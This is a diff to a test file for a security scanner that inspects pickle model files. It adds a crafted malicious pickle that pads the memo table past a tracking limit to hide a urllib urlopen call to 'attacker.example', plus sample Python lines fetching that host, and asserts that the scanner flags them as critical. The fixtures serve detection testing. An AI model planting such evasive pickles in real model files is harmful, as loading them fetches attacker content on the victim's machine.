@@ -20,6 +20,7 @@ from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, Iss
 from modelaudit.scanners.pickle_scanner import (
     _BINARY_TAIL_SCAN_BYTES,
     _PICKLE_LITERAL_RECORD_MAX_OPCODES,
+    _PYTORCH_LEGACY_MAX_TRACKED_MEMO_ENTRIES,
     ALWAYS_DANGEROUS_FUNCTIONS,
     ALWAYS_DANGEROUS_MODULES,
     PickleScanner,
@@ -136,6 +137,19 @@ def _global_reduce_payload(module: str, func: str) -> bytes:
 
 def _make_opcode_padding_stream(opcode_pairs: int) -> bytes:
     return b"\x80\x02" + (b"K\x010" * opcode_pairs) + b"."
+
+
+def _memo_overflow_urlopen_payload() -> bytes:
+    overflow_index = _PYTORCH_LEGACY_MAX_TRACKED_MEMO_ENTRIES
+    return (
+        b"\x80\x04"
+        + (b"N\x94" * overflow_index)
+        + b"curllib.request\nurlopen\n"
+        + _short_binunicode(b"https://attacker.example/payload")
+        + b"\x940j"
+        + overflow_index.to_bytes(4, "little")
+        + b"\x85R."
+    )
 
 
 def _make_pre_memoized_post_budget_stack_global_payload(tail: bytes) -> bytes:
@@ -1712,6 +1726,7 @@ def test_scan_stream_keeps_executable_network_literal_actionable() -> None:
         "from requests import get\nget('https://attacker.example/payload')",
         "from requests import post as send\nsend('https://attacker.example/payload')",
         "import requests as r\nr.get('https://attacker.example/payload')",
+        "import os, httpx as h\nh.get('https://attacker.example/payload')",
         "import urllib.request as u\nu.urlopen('https://attacker.example/payload')",
     ],
 )
@@ -1795,6 +1810,35 @@ def test_scan_stream_keeps_network_url_reducer_actionable() -> None:
         issue.severity == IssueSeverity.CRITICAL
         and issue.details.get("pickle_rule_code") == "DANGEROUS_CALL"
         and issue.details.get("associated_global") == "urllib.request.urlopen"
+        for issue in result.issues
+    )
+    explicit_url_issues = [
+        issue
+        for issue in result.issues
+        if issue.rule_code == "S310"
+        and issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("type") == "explicit_network_pattern"
+        and issue.details.get("matched_text") == "https://attacker.example/payload"
+    ]
+    assert len(explicit_url_issues) == 1
+
+
+def test_scan_stream_fails_closed_for_memo_overflow_url_reducer() -> None:
+    payload = _memo_overflow_urlopen_payload()
+
+    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="memo-overflow-urlopen.pkl")
+
+    assert any(
+        issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("pickle_rule_code") == "DANGEROUS_CALL"
+        and issue.details.get("associated_global") == "urllib.request.urlopen"
+        for issue in result.issues
+    )
+    assert any(
+        issue.rule_code == "S310"
+        and issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("type") == "explicit_network_pattern"
+        and issue.details.get("matched_text") == "https://attacker.example/payload"
         for issue in result.issues
     )
 
